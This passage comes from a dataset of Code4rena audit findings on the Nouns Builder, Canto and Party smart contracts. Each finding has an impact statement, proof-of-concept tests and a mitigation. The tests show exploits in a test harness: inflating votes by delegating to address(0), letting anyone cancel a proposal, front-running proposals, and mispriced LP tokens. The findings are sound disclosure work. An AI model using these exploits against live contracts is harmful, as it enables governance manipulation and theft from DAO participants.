super.setUp();          vm.label(user1, \"user1\");         vm.label(delegate1, \"delegate1\");         deployMock();     }      function setMockFounderParams() internal virtual override {         address[] memory wallets = new address[](1);         uint256[] memory percents = new uint256[](1);         uint256[] memory vestingEnds = new uint256[](1);          wallets[0] = founder;         percents[0] = 0;         vestingEnds[0] = 4 weeks;          setFounderParams(wallets, percents, vestingEnds);     }      function test_pown2() public {         // user1 gets one token         vm.startPrank(address(auction));         token.mint();         token.transferFrom(address(auction), user1, 0);         vm.stopPrank();          // user1 has 1 token & 1 vote         assertEq(token.balanceOf(user1), 1);         assertEq(token.getVotes(user1), 1);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), 0);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), type(uint192).max);     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Either: 1. Don't allow delegation to address(0) by adding a check or 2. If someone tries to delegate to address(0), delegate to the NFT owner instead"}, {"title": "A proposal can be cancelled by anyone if the proposal has exactly proposalThreshold votes", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/194", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363   # Vulnerability details  ## Impact If the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.  When creating a proposal the requirement is \"Ensure the caller's voting weight is greater than or equal to the threshold\". When cancelling a proposal the check is: if `getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold` then it the cancelling is not allowed. In effect, if the number of votes is lower than *or equal* to the proposalThreshold it can be cancelled.  In the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.  ## Proof of Concept The forge test below demonstrates the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import \"forge-std/console.sol\"; import { NounsBuilderTest } from \"../utils/NounsBuilderTest.sol\";  import { IManager } from \"../../src/manager/IManager.sol\"; import { IGovernor } from \"../../src/governance/governor/IGovernor.sol\"; import { GovernorTypesV1 } from \"../../src/governance/governor/types/GovernorTypesV1.sol\";  contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {     uint256 internal constant AGAINST = 0;     uint256 internal constant FOR = 1;     uint256 internal constant ABSTAIN = 2;     uint256 proposalThresholdBps = 100;      address internal voter1 = address(0x1234);     address internal randomUser = address(0x8888);      function setUp() public virtual override {         super.setUp();          deployMock();     }      function testCanCancelProposalIfExactThreshold() public {         // mint a few tokens         for (uint256 i; i < 85; i++) {             vm.prank(address(auction));             token.mint();         }         assertEq(token.totalSupply(), 100);          // transfer one token to voter1         vm.prank(address(auction));         token.transferFrom(address(auction), voter1, 5);         assertEq(token.balanceOf(voter1), 1);          // make sure voter has enough votes         assertEq(governor.proposalThreshold(), 1);         assertEq(token.getVotes(voter1), 1);          vm.warp(block.timestamp + 1);          // propose         (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();         vm.prank(voter1);         bytes32 proposalId = governor.propose(targets, values, calldatas, \"test\");          // Proposal created successfully         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));          // Cancel proposal         vm.prank(randomUser);         governor.cancel(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));     }      function setMockGovParams() internal virtual override {         setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);     }      function mockProposal()         internal         view         returns (             address[] memory targets,             uint256[] memory values,             bytes[] memory calldatas         )     {         targets = new address[](1);         values = new uint256[](1);         calldatas = new bytes[](1);          targets[0] = address(auction);         calldatas[0] = abi.encodeWithSignature(\"pause()\");     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Change the check in `cancel` to match the requirement in `propose`; change line 363 in Governor.sol to: `if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)` "}, {"title": "Multiple vote checkpoints per block will lead to incorrect vote accounting", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/185", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253   # Vulnerability details  Voting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of `ERC721Votes` creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.  ## Impact  Checkpoints with the same `timestamp` will cause issues within the `ERC721Votes.getPastVotes(..)` function and will return incorrect votes for a given `_timestamp`.  ## Proof of Concept  [lib/token/ERC721Votes.sol#L252-L253](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253)  ```solidity /// @dev Records a checkpoint /// @param _account The account address /// @param _id The checkpoint id /// @param _prevTotalVotes The account's previous voting weight /// @param _newTotalVotes The account's new voting weight function _writeCheckpoint(     address _account,     uint256 _id,     uint256 _prevTotalVotes,     uint256 _newTotalVotes ) private {     // Get the pointer to store the checkpoint     Checkpoint storage checkpoint = checkpoints[_account][_id];      // Record the updated voting weight and current time     checkpoint.votes = uint192(_newTotalVotes);     checkpoint.timestamp = uint64(block.timestamp);      emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes); } ```  **Consider the following example and the votes checkpoint snapshots:**  _Note: Bob owns a smart contract used to interact with the protocol_  **Transaction 0:** Bob's smart contract receives 1 NFT through minting (1 NFT equals 1 vote)  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     |  **Transaction 1:** Bob's smart contract receives one more NFT through minting  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     |  **Transaction 1:** Within the same transaction 1, Bob's smart-contract delegates 2 votes to Alice  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     |  **Transaction 1:** Again within the same transaction 1, Bob's smart contract decides to reverse the delegation and self-delegates  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     |  **Transaction 1:** Bob's smart contract buys one more NFT  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     | | 4                | 2         | 3     |  Bob now wants to vote (via his smart contract) on a governance proposal that has been created on `timeCreated = 1` (timestamp 1).  Internally, the `Governor._castVote` function determines the voter's weight by calling `getVotes(_voter, proposal.timeCreated)`.  [governance/governor/Governor.sol#L275](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275)  ```solidity weight = getVotes(_voter, proposal.timeCreated); ```  `getVotes` calls `ERC721.getPastVotes` internally:  [governance/governor/Governor.sol#L462](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462)  ```solidity function getVotes(address _account, uint256 _timestamp) public view returns (uint256) {     return settings.token.getPastVotes(_account, _timestamp); } ```  `ERC721.getPastVotes(..., 1)` tries to find the checkpoint within the `while` loop:  | # Iteration | `low` | `middle` | `high` | | ----------- | ----- | -------- | ------ | | 0           | 0     | 2        | 4      |  The `middle` checkpoint with index `2` matches the given timestamp `1` and returns `0` votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.  _(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)_  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints. "}, {"title": "Creating a new governance proposal can be prevented by anyone", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377   # Vulnerability details  When creating a new governance proposal, the `proposalId` is generated by hashing the proposal data (`_targets, _values, _calldatas, descriptionHash`). To prevent duplicated proposals, the current `Governor` implementation checks if the `proposalId` exists already. If it exists, the call will revert with the `PROPOSAL_EXISTS` error.  ## Impact  Anyone can prevent others from creating governance proposals by front-running the create proposal transaction with the same data, followed by an immediate call to the `Governor.cancel` function.  This will prevent creating a proposal with the same proposal data. A proposal creator would have to slightly change the proposal to try to create it again (however, it can be prevented again due to the aforementioned issue)  ## Proof of Concept  [governance/governor/Governor.propose](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151)  ```solidity function propose(     address[] memory _targets,     uint256[] memory _values,     bytes[] memory _calldatas,     string memory _description ) external returns (bytes32) {     [..]      // Compute the description hash     bytes32 descriptionHash = keccak256(bytes(_description));      // Compute the proposal id     bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);      // Get the pointer to store the proposal     Proposal storage proposal = proposals[proposalId];      // Ensure the proposal doesn't already exist     if (proposal.voteStart != 0) revert PROPOSAL_EXISTS(proposalId); // @audit-info Reverts in case the proposals with the same data exists already      [..] } ```  [governance/governor/Governor.cancel](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377)  Cancelling a proposal updates the `proposal.canceled` boolean property to `true`. `proposal.voteStart` is left unchanged (`!= 0`).  ```solidity /// @notice Cancels a proposal /// @param _proposalId The proposal id function cancel(bytes32 _proposalId) external {     // Ensure the proposal hasn't been executed     if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();      // Get a copy of the proposal     Proposal memory proposal = proposals[_proposalId];      // Cannot realistically underflow and `getVotes` would revert     unchecked {         // Ensure the caller is the proposer or the proposer's voting weight has dropped below the proposal threshold         if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold)             revert INVALID_CANCEL();     }      // Update the proposal as canceled     proposals[_proposalId].canceled = true;      // If the proposal was queued:     if (settings.treasury.isQueued(_proposalId)) {         // Cancel the proposal         settings.treasury.cancel(_proposalId);     }      emit ProposalCanceled(_proposalId); } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider adding a per-account nonce storage variable (e.g. `mapping(address => uint256) internal proposalCreatorNonces;` to the `Governor` contract and include the `proposalCreatorNonces[msg.sender]++` nonce within the computed proposal id. "}, {"title": "Token: Founder percentages not always respected", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/107", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/Token.sol#L110   # Vulnerability details  ## Impact Because of the \"greedy\" minting scheme for founders (tokens to founders are minted until `_isForFounder` returns `false`, i.e. until there is an unset `tokenRecipient[tokenId % 100]`), it can happen that the actual percentages of tokens that the founders receive deviate significantly from the desired percentages:  ##  Proof Of Concept Imagine we are in a situation where one founder has a 51% share and the other a 48% share. Because `schedule` is set to 1 for the first founder, `tokenRecipient[0] ... tokenRecipient[50]` will be set to his address. `tokenRecipient[51], tokenRecipient[53], ...` is set to the address of the second founder. Now let's say a mint happens just before the `vestExpiry` and when `tokenId % 100 == 0`. In such a situation, founder 1 will get 51 tokens (because of the consecutive entries in `tokenRecipients`) and founder 2 will get 1 token (because of the entry in `tokenRecipient[51]`, which is also consecutive. Let's say that the next mint happens after the vest expiration, which means that no founders get additional tokens.  In such a situation, founder 1 got 51 of the \"last 100\" token IDs, whereas founder 2 only got 1. Therefore, the overall percentage of tokens that those founders got will not be 51% and 40%. When the vest expiration was set to a time far in the future, it will be close to it, but when the vest timespan was only short, it can be very bad. In the extreme case where the expiration is set such that only 1 mint call causes mints for founders, founder 1 will have 51 tokens and founder 2 only 1, meaning the percentages are 51% / 1% instead of 51% / 48%!  ## Recommended Mitigation Steps Consider using another distribution scheme. Instead of the current \"greedy\" scheme (minting until a slot is free), it would make sense to mint the tokens for the founders every 100 tokens, i.e. everytime when `tokenId % 100 == 0`. Like that, it is ensured that the actual percentages are equal to the desired percentages."}, {"title": "Owners receive more percentage of total nft if some nfts were burned(because were not sold)", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/94", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213   # Vulnerability details  ## Impact According to nouns builder, founder can have percentage of created nft. This is set in `Token::_addFounders` function.  When new nft is minted by `mint` function then total supply of tokens is incremented and assigned to tokenId using `tokenId = settings.totalSupply++`. Then this token is checked if it should be mint to founder(then again increment total supply of tokens) or should be mint to auction using `while (_isForFounder(tokenId))`.  If token wasn't sold during the auction then auction burns it using `burn` function. And this function doesn't decrement `settings.totalSupply` value. But total supply **has changed** now, it has decreased by one.  So suppose that we have 1 founder of dao that should receive 2% of nft, that means that if 100 nft are available(for example), then 2 of them belongs to that founder. If we have minted 100 nft and 10 of them were not sold(they were then burned), then there are 90 nft available now. And in current implementation founder has ownership of 2 of them, however **2 is not 2% of 90**. So in case when nft are not sold on auction the percentage of founder's tokens is increasing and the increasing speed depends on how many tokens were not sold. Also founder gets more power in the community(as he has more percentage now).   ## Proof of Concept https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L154 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L207-L213  ## Tools Used  ## Recommended Mitigation Steps When `burn` function is called then do `settings.totalSupply--`."}, {"title": "MetadataRenderer contract raise error when minting", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L194   # Vulnerability details  ## Impact It is not possible to mint a ERC721 token if its properties has different length than it's items.  ## Proof of Concept  I run the following test to reproduce the error:          deployMock();          vm.prank(address(governor));         string[] memory _names = new string[](1);         _names[0] = \"propertyName\"; //fill _names with some value         MetadataRendererTypesV1.ItemParam[] memory _items; //define empty array                  MetadataRendererTypesV1.IPFSGroup memory _ipfsGroup;          _ipfsGroup.baseUri = \"\";         _ipfsGroup.extension = \"\";         MetadataRenderer(token.metadataRenderer()).addProperties(_names, _items, _ipfsGroup); //call add property with _items array empty.          vm.stopPrank();         vm.prank(address(auction));          uint256 success = token.mint();//error happens inside here         assert(success != 0);          vm.stopPrank();           Log from Foundry console:      \u251c\u2500 [736] TOKEN::metadataRenderer() [staticcall]     \u2502   \u251c\u2500 [353] Token::metadataRenderer() [delegatecall]     \u2502   \u2502   \u2514\u2500 \u2190 METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     \u2502   \u2514\u2500 \u2190 METADATA_RENDERER: [0x7076fd06ec2d09d4679d9c35a8db81ace7a07ee2]     \u251c\u2500 [78618] METADATA_RENDERER::addProperties([\"propertyName\"], [], (\"\", \"\"))     \u2502   \u251c\u2500 [78172] MetadataRenderer::addProperties([\"propertyName\"], [], (\"\", \"\")) [delegatecall]     \u2502   \u2502   \u251c\u2500 emit OwnerUpdated(prevOwner: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], newOwner: TREASURY: [0xf8cf955543f1ce957b81c1786be64d5fc96ad7b5])           \u2502   \u2502   \u251c\u2500 emit PropertyAdded(id: 0, name: \"propertyName\")     \u2502   \u2502   \u2514\u2500 \u2190 ()     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [0] VM::stopPrank()     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [0] VM::prank(AUCTION: [0x9a1450e42d752b8731bc88f20dbaa9154642f1e6])     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [121037] TOKEN::mint()     \u2502   \u251c\u2500 [120650] Token::mint() [delegatecall]     \u2502   \u2502   \u251c\u2500 emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], tokenId: 0)     \u2502   \u2502   \u251c\u2500 emit DelegateVotesChanged(delegate: FOUNDER: [0xd3562fd10840f6ba56112927f7996b7c16edfcc1], prevTotalVotes: 0, newTotalVotes: 1)     \u2502   \u2502   \u251c\u2500 [25762] METADATA_RENDERER::onMinted(0)     \u2502   \u2502   \u2502   \u251c\u2500 [25372] MetadataRenderer::onMinted(0) [delegatecall]     \u2502   \u2502   \u2502   \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2502   \u2502   \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2502   \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2502   \u2514\u2500 \u2190 \"Division or modulo by 0\"     \u2514\u2500 \u2190 \"Division or modulo by 0\"    ## Tools Used Foundry Manual  ## Recommended Mitigation Steps It could be mitigated checking length of both arrays in MetadataRenderer.addProperties() method.  It could be done after those lines: https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L111-L115  Also I recommend to move those declaration and new validation at the beginning to save gas."}, {"title": "Issue with totalSupplyAvg value calculation ", "html_url": "https://github.com/code-423n4/2022-09-canto-findings/issues/134", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-canto/blob/65fbb8b9de22cf8f8f3d742b38b4be41ee35c468/src/Swap/BaseV1-core.sol#L260-L269   # Vulnerability details  ## Impact BaseV1-core.sol#L260 `totalSupplyAvg` may not provide the average value when `granularity` is lesser than or greater(too away from median value) than the total number of `_totalSupplyAvg`  ## Proof of Concept https://github.com/code-423n4/2022-09-canto/blob/65fbb8b9de22cf8f8f3d742b38b4be41ee35c468/src/Swap/BaseV1-core.sol#L260-L269      function totalSupplyAvg(uint granularity) external view returns(uint) {         uint[] memory _totalSupplyAvg = sampleSupply(granularity, 1);         uint totalSupplyCumulativeAvg;           for (uint i = 0; i < _totalSupplyAvg.length; ++i) {             totalSupplyCumulativeAvg += _totalSupplyAvg[i]; //totalSupply denominated in terms of 1e18          }           return (totalSupplyCumulativeAvg / granularity);     }  In above code the average is computed based on `granularity` but thie `granularity` can be a value which is too far away from the median value. say, it could be too away from `_totalSupplyAvg.length`  ## Tools Used VS code and Manual code review  ## Recommended Mitigation Steps It is suggested to calculate the average value based on `_totalSupplyAvg.length` `totalSupplyCumulativeAvg / _totalSupplyAvg.length` "}, {"title": " `getUnderlyingPrice()` should return `0` when errored", "html_url": "https://github.com/code-423n4/2022-09-canto-findings/issues/93", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-canto/blob/65fbb8b9de22cf8f8f3d742b38b4be41ee35c468/src/Swap/BaseV1-periphery.sol#L487-L522   # Vulnerability details  ## Impact  The `Comptroller` is expecting `oracle.getUnderlyingPrice` to return `0` for errors (Compound style returns, no revert). The current implementation will throw errors, resulting in the consumer of the oracle getting unexpected errors.  ## Proof of Concept  ```solidity function getUnderlyingPrice(CToken ctoken) external override view returns(uint) {          address underlying;         { //manual scope to pop symbol off of stack         string memory symbol = ctoken.symbol();         if (compareStrings(symbol, \"cCANTO\")) {             underlying = address(wcanto);             return getPriceNote(address(wcanto), false);         } else {             underlying = address(ICErc20(address(ctoken)).underlying()); // We are getting the price for a CErc20 lending market         }         //set price statically to 1 when the Comptroller is retrieving Price         if (compareStrings(symbol, \"cNOTE\")) { // note in terms of note will always be 1              return 1e18; // Stable coins supported by the lending market are instantiated by governance and their price will always be 1 note         }          else if (compareStrings(symbol, \"cUSDT\") && (msg.sender == Comptroller )) {             uint decimals = erc20(underlying).decimals();             return 1e18 * 1e18 / (10 ** decimals); //Scale Price as a mantissa to maintain precision in comptroller         }          else if (compareStrings(symbol, \"cUSDC\") && (msg.sender == Comptroller)) {             uint decimals = erc20(underlying).decimals();             return 1e18 * 1e18 / (10 ** decimals); //Scale Price as a mantissa to maintain precision in comptroller         }         }                  if (isPair(underlying)) { // this is an LP Token             return getPriceLP(IBaseV1Pair(underlying));         }         // this is not an LP Token         else {             if (isStable[underlying]) {                 return getPriceNote(underlying, true); // value has already been scaled             }              return getPriceCanto(underlying) * getPriceNote(address(wcanto), false) / 1e18;         }        } ```   The `Comptroller` is expecting `oracle.getUnderlyingPrice` to return `0` for errors (Compound style returns, no revert).  However, the current implementation will revert when errored:  https://github.com/code-423n4/2022-09-canto/blob/65fbb8b9de22cf8f8f3d742b38b4be41ee35c468/src/Swap/BaseV1-periphery.sol#L549-L593  ```solidity function getPriceLP(IBaseV1Pair pair) internal view returns(uint) {         uint[] memory supply = pair.sampleSupply(8, 1);         uint[] memory prices;          uint[] memory unitReserves;          uint[] memory assetReserves;          address token0 = pair.token0();         address token1 = pair.token1();         uint decimals; ```  https://github.com/code-423n4/2022-09-canto/blob/65fbb8b9de22cf8f8f3d742b38b4be41ee35c468/src/Swap/BaseV1-core.sol#L271-L289  ```solidity function sampleSupply(uint points, uint window) public view returns (uint[] memory) {         uint[] memory _totalSupply = new uint[](points);                  uint lastIndex = observations.length-1;         require(lastIndex >= points * window, \"PAIR::NOT READY FOR PRICING\");         uint i = lastIndex - (points * window); // point from which to begin the sample         uint nextIndex = 0;         uint index = 0;         uint timeElapsed;          for(; i < lastIndex; i+=window) {             nextIndex = i + window;             timeElapsed = observations[nextIndex].timestamp - observations[i].timestamp;             _totalSupply[index] = (observations[nextIndex].totalSupplyCumulative - observations[i].totalSupplyCumulative) / timeElapsed;             index = index + 1;         }          return _totalSupply;     } ```  ## Recommended Mitigation Steps  Consider using `try catch` and return 0 when errored."}, {"title": "Period Size not updated on creating new Pair", "html_url": "https://github.com/code-423n4/2022-09-canto-findings/issues/76", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-canto/blob/main/src/Swap/BaseV1-core.sol#L598   # Vulnerability details  ## Impact The period size is not update to current while creating a new pair. This means even if period size has been reduced from default value, this new pair will still point to the higher default value  ## Proof of Concept  1. Assume Pair P1,P2 exists in BaseV1Factory with default period size as 1800  2. Admin decides to decrease the period size to 900 using [setPeriodSize](https://github.com/code-423n4/2022-09-canto/blob/main/src/Swap/BaseV1-core.sol#L560) function  ``` function setPeriodSize(uint newPeriod) external {         require(msg.sender == admin);         require(newPeriod <= MaxPeriod);          for (uint i; i < allPairs.length; ) {             BaseV1Pair(allPairs[i]).setPeriodSize(newPeriod);             unchecked {++i;}         }     } ```  3. This changes period size of P1, P2 to 900  4. Admin creates a new Pair P3 using [createPair](https://github.com/code-423n4/2022-09-canto/blob/main/src/Swap/BaseV1-core.sol#L598) function  ``` function createPair(address tokenA, address tokenB, bool stable) external returns (address pair) {         require(tokenA != tokenB, \"IA\"); // BaseV1: IDENTICAL_ADDRESSES         (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);         require(token0 != address(0), \"ZA\"); // BaseV1: ZERO_ADDRESS         require(getPair[token0][token1][stable] == address(0), \"PE\"); // BaseV1: PAIR_EXISTS - single check is sufficient         bytes32 salt = keccak256(abi.encodePacked(token0, token1, stable)); // notice salt includes stable as well, 3 parameters         (_temp0, _temp1, _temp) = (token0, token1, stable);         pair = address(new BaseV1Pair{salt:salt}());         getPair[token0][token1][stable] = pair;         getPair[token1][token0][stable] = pair; // populate mapping in the reverse direction         allPairs.push(pair);         isPair[pair] = true;         emit PairCreated(token0, token1, stable, pair, allPairs.length);     } ```  5. A new Pair is created but the period size is not updated which means P3's period size will be 1800 instead of 900 which is incorrect  ## Recommended Mitigation Steps Add a new variable which stores the updated period size. Once a pair is created, update its period size using this new variable  ``` uint periodSizeUpdated=1800;  function setPeriodSize(uint newPeriod) external {         ... periodSizeUpdated=newPeriod;     }  function createPair(address tokenA, address tokenB, bool stable) external returns (address pair) { ... BaseV1Pair(pair).setPeriodSize(newPeriod);  } ```"}, {"title": "Calculated `token0TVL` may be zero under certain scenarios", "html_url": "https://github.com/code-423n4/2022-09-canto-findings/issues/41", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-canto/blob/main/src/Swap/BaseV1-periphery.sol#L582   # Vulnerability details  ## Details & Impact  ```solidity uint token0TVL = assetReserves[i] * (prices[i] / decimals); ```  Because of the brackets, the division of `prices[i] / decimals` is executed before multiplication, causing `token0TVL` to potentially be zero.  ## Proof of Concept  Add the following test in `oracle.test.ts`. Note: `getPriceLP()` should have its visibility changed from internal to public as the test relies on it.  To summarise what the test is doing, a stablecoin of 24 decimals is deployed, whose address will be greater than the `note` address so that `token0 = note`. It will enter the following case:  ```solidity if (pair.stable()) { // stable pairs will be priced in terms of Note   if (token0 == note) { //token0 is the unit, token1 will be priced with respect to this asset initially       decimals = 10 ** (erc20(token1).decimals()); // we must normalize the price of token1 to 18 decimals       prices = pair.sample(token1, decimals, 8, 1);       (unitReserves, assetReserves) = pair.sampleReserves(8, 1); ```  such that the `prices`\u2019s denomination is smaller than the stablecoin\u2019s decimals of 24.  To see the difference in test results, apply the recommended fix after running the test once. In essence, the LP\u2019s price will double from `999500000001499` to `1999999998838589`, which is expected since the LP token should be worth the combined value of both stablecoins.  ```solidity it.only(\"will have 0 token0TVL\", async () => {   // NOTE: change getPriceLP() from internal to public so that function can be called   let tokenFactory = await ethers.getContractFactory(\"ERC20\", dep)   let stablecoin = await tokenFactory.deploy(\"STABLE\",\"STABLE\",ethers.utils.parseUnits(\"100000\", \"24\"), 24)   await stablecoin.deployed()   // we want note to be token0   // redeploy till it is   while (stablecoin.address < note.address) {       stablecoin = await tokenFactory.deploy(\"STABLE\",\"STABLE\",ethers.utils.parseUnits(\"100000\", \"24\"), 24)       await stablecoin.deployed()   }   // give token approvals to router   let noteIn = ethers.utils.parseUnits(\"10000\", \"18\")   let stableIn = ethers.utils.parseUnits(\"10000\", \"24\")   await (await note.approve(router.address, ethers.constants.MaxUint256)).wait()   await (await stablecoin.approve(router.address, ethers.constants.MaxUint256)).wait()    // borrow note   await (await comptroller._supportMarket(cUsdc.address)).wait()   // set collateral factors for cCanto    await (await comptroller._setCollateralFactor(cUsdc.address, ethers.utils.parseUnits(\"0.9\", \"18\"))).wait()   // borrow note against usdc    await (await comptroller.enterMarkets([cUsdc.address, cNote.address])).wait()   await (await usdc.approve(cUsdc.address, ethers.utils.parseUnits(\"1000\"))).wait()   // supply usdc   await (await cUsdc.mint(ethers.utils.parseUnits(\"100000000\", \"6\"))).wait()   // borrow note   await (await cNote.borrow(ethers.utils.parseUnits(\"9000000\", \"18\"))).wait()    // add liquidity   await (await router.addLiquidity(       note.address,       stablecoin.address,       true,       noteIn,       stableIn,       0,       0,       dep.address,       9999999999,       )).wait()   // get pair address   let pairAddr = await factory.getPair(note.address, stablecoin.address, true)   pair = await ethers.getContractAt(\"BaseV1Pair\", pairAddr)    //set period size to zero for instant observations   await (await factory.setPeriodSize(0)).wait()    // swap 10 times for price observations   for(var i = 0; i < 10; i++) {       if (i % 2) {           //swap 0.01 note for stable           await (await router.swapExactTokensForTokensSimple(               ethers.utils.parseUnits(\"10\", \"18\"),               0,               note.address,               stablecoin.address,               true,               dep.address,               9999999999999           )).wait()       } else {           //swap stable for note           await (await router.swapExactTokensForTokensSimple(               ethers.utils.parseUnits(\"10\", \"24\"),               0,               stablecoin.address,               note.address,               true,               dep.address,               9999999999999           )).wait()       }   }   // check lpToken price   // Actual price calculated is 999500000001499   // But expected price (after removing brackets) is 1999999998838589   console.log((await router.getPriceLP(pairAddr)).toString()); }); ```  ## Recommended Mitigation Steps  ```diff - uint token0TVL = assetReserves[i] * (prices[i] / decimals); + uint token0TVL = assetReserves[i] * prices[i] / decimals; ```"}, {"title": "Previously nominated delegate can reset the delegation", "html_url": "https://github.com/code-423n4/2022-09-party-findings/issues/361", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "high quality report", "resolved", "sponsor confirmed", "old-submission-method"], "target": "2022-09-party-findings", "body": "# Lines of code  